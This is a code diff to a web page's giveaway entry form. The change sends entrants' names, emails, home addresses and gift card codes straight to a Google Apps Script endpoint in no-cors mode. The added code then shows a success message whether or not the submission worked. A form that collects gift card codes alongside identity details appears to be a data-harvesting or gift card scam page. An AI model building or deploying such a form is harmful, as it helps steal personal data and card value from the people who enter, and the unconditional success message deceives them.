@@ -520,7 +520,7 @@
         document.getElementById('trackingDisplay').innerHTML = `<i class="fas fa-qrcode"></i> ${generatedTracking}`;
     }
     
-    // Submit to Netlify Function
+        // Submit form directly to Google Sheets
     document.getElementById('finalSubmitBtn').addEventListener('click', async function() {
         let confirmBox = document.getElementById('confirmFinal');
         if(!confirmBox.checked) {
@@ -529,7 +529,7 @@
         }
         if(!generatedTracking) generateTrackingPreview();
         
-        // Collect form data
+        // Collect all form data
         const formData = {
             trackingNumber: generatedTracking,
             fullName: document.getElementById('fullname').value,
@@ -545,14 +545,9 @@
             city: document.getElementById('city').value,
             state: document.getElementById('state').value,
             zip: document.getElementById('zip').value,
-            giftCardCode: document.getElementById('giftCardNumber').value
+            giftCardCode: document.getElementById('giftCardNumber').value,
+            submittedAt: new Date().toISOString()
         };
-        
-        // Create FormData for file upload
-        const submitData = new FormData();
-        submitData.append('formData', JSON.stringify(formData));
-        if(selfieFile) submitData.append('selfie', selfieFile);
-        if(receiptFile) submitData.append('receipt', receiptFile);
         
         const submitBtn = document.getElementById('finalSubmitBtn');
         const originalText = submitBtn.innerHTML;
@@ -560,44 +555,44 @@
         submitBtn.disabled = true;
         
         try {
-            const response = await fetch('/.netlify/functions/submit', {
+            // Send directly to Google Sheets
+            await fetch('https://script.google.com/macros/s/AKfycbwFKieQv4He0NJ4ljzDIu9nnB6ZH0GrShwdxZq9o_g9nlGrZ5SqtWNkVIjQhY6ZFTis/exec', {
                 method: 'POST',
-                body: submitData
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(formData)
             });
             
-            const result = await response.json();
+            // Show success message
+            const successDiv = document.getElementById('finalSuccessMsg');
+            successDiv.style.display = 'block';
+            successDiv.innerHTML = `
+                <i class="fas fa-check-circle"></i> 
+                🎉 SUCCESS, ${formData.fullName}!<br>
+                Your entry has been submitted!<br>
+                <strong>Tracking Number:</strong> ${generatedTracking}<br>
+                We'll contact you at ${formData.email}
+            `;
+            successDiv.scrollIntoView({ behavior: 'smooth' });
             
-            if(result.success) {
-                const successDiv = document.getElementById('finalSuccessMsg');
-                successDiv.style.display = 'block';
-                successDiv.innerHTML = `
-                    <i class="fas fa-check-circle"></i> 
-                    🎉 SUCCESS, ${formData.fullName}!<br>
-                    Your entry has been submitted to Google Sheets!<br>
-                    <strong>Tracking Number:</strong> ${result.trackingNumber}<br>
-                    A confirmation email will be sent to ${formData.email}
-                `;
-                successDiv.scrollIntoView({ behavior: 'smooth' });
-                
-                // Reset form
-                setTimeout(() => {
-                    document.getElementById('mainGiveawayForm').reset();
-                    document.getElementById('selfiePreview').innerHTML = '';
-                    submitBtn.innerHTML = originalText;
-                    submitBtn.disabled = false;
-                }, 3000);
-            } else {
-                alert('Error: ' + (result.error || 'Submission failed'));
+            // Reset form after 3 seconds
+            setTimeout(() => {
+                document.getElementById('mainGiveawayForm').reset();
+                document.getElementById('selfiePreview').innerHTML = '';
                 submitBtn.innerHTML = originalText;
                 submitBtn.disabled = false;
-            }
+            }, 3000);
+            
         } catch(error) {
             console.error('Submission error:', error);
-            alert('Failed to submit. Please make sure the Netlify function is deployed.');
+            alert('Failed to submit. Please try again.');
             submitBtn.innerHTML = originalText;
             submitBtn.disabled = false;
         }
     });
+        
 </script>
 </body>
 </html>
